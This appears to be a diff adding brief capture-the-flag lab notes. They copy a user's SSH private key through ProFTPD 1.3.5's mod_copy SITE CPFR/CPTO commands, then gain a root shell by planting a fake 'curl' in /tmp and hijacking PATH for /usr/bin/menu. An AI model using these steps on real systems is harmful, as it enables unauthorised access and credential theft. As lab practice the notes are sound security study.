@@ -1,0 +1,16 @@
+nc 10.10.41.255 21        
+220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.41.255]
+SITE CPFR /home/kenobi/.ssh/id_rsa
+350 File or directory exists, ready for destination name
+SITE CPTO /var/tmp/id_rsa
+250 Copy successful
+
+
+https://www.exploit-db.com/searchsploit
+http://www.proftpd.org/docs/contrib/mod_copy.html
+
+cd /tmp
+echo /bin/sh > curl
+chmod 777 curl
+export PATH=/tmp:$PATH
+/usr/bin/menu
